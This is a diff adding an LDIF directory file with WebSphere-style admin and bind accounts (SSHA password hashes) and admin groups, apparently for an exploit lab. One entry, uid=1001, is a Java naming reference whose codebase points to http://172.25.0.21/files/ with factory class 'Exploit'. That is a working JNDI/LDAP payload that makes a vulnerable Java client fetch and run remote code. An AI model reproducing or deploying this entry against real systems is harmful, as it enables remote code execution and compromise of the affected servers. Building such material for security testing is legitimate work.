@@ -1,0 +1,96 @@
+version: 1
+
+dn: cn=groups,dc=denver,dc=example,dc=com
+objectClass: document
+objectClass: subschema
+objectClass: top
+documentIdentifier: groups
+cn: groups
+
+dn: uid=wpsadmin,cn=users,dc=denver,dc=example,dc=com
+objectclass: inetOrgPerson
+objectclass: organizationalPerson
+objectclass: person
+objectclass: top
+cn: wps admin
+sn: admin
+givenName: wps
+uid: wpsadmin
+userpassword:: e1NTSEF9SjVnQzhjdTNLbEZBY3hXUys4YUhPYzhuSnZ4NnMzM3ZpdjJsUnc9P
+ Q==
+
+dn: cn=wpsDocReviewer,cn=groups,dc=denver,dc=example,dc=com
+objectclass: groupOfUniqueNames
+objectclass: top
+cn: wpsDocReviewer
+uniquemember: uid=wpsadmin,cn=users,dc=denver,dc=example,dc=com
+
+dn: dc=denver,dc=example,dc=com
+objectClass: domain
+objectClass: top
+dc: denver
+
+dn: dc=example,dc=com
+objectclass: domain
+objectclass: top
+dc: example
+
+dn: uid=1001,dc=example,dc=com
+objectClass: account
+objectClass: javaNamingReference
+objectClass: javaObject
+objectClass: top
+javaClassName: foo
+uid: 1001
+javaCodebase: http://172.25.0.21/files/
+javaFactory: Exploit
+
+dn: uid=wpsbind,cn=users,dc=denver,dc=example,dc=com
+objectclass: inetOrgPerson
+objectclass: organizationalPerson
+objectclass: person
+objectclass: top
+cn: wps bind
+sn: bind
+givenName: wps
+uid: wpsbind
+userpassword:: e1NTSEF9NUtQMUU4TFZjaklrMVBWQjFpOWd5MFRKaWpUZ29HUURFT2s0QXc9P
+ Q==
+
+dn: uid=wasadmin,cn=users,dc=denver,dc=example,dc=com
+objectclass: inetOrgPerson
+objectclass: organizationalPerson
+objectclass: person
+objectclass: top
+cn: was admin
+sn: admin
+givenName: was
+uid: wasadmin
+userpassword:: e1NTSEF9bnVySk05Z253NVgrSVo0dXJEMjFiKzd1c2FMNjlqemZLNURUUUE9P
+ Q==
+
+dn: cn=users,dc=denver,dc=example,dc=com
+objectClass: document
+objectClass: subschema
+objectClass: top
+documentIdentifier: users
+cn: users
+
+dn: cn=wpsadmins,cn=groups,dc=denver,dc=example,dc=com
+objectclass: groupOfUniqueNames
+objectclass: top
+cn: wpsadmins
+uniquemember: uid=wpsadmin,cn=users,dc=denver,dc=example,dc=com
+
+dn: cn=wpsContentAdministrators,cn=groups,dc=denver,dc=example,dc=com
+objectclass: groupOfUniqueNames
+objectclass: top
+cn: wpsContentAdministrators
+uniquemember: uid=wpsadmin,cn=users,dc=denver,dc=example,dc=com
+
+dn: cn=wcmadmins,cn=groups,dc=denver,dc=example,dc=com
+objectclass: groupOfUniqueNames
+objectclass: top
+cn: wcmadmins
+uniquemember: uid=wpsadmin,cn=users,dc=denver,dc=example,dc=com
+
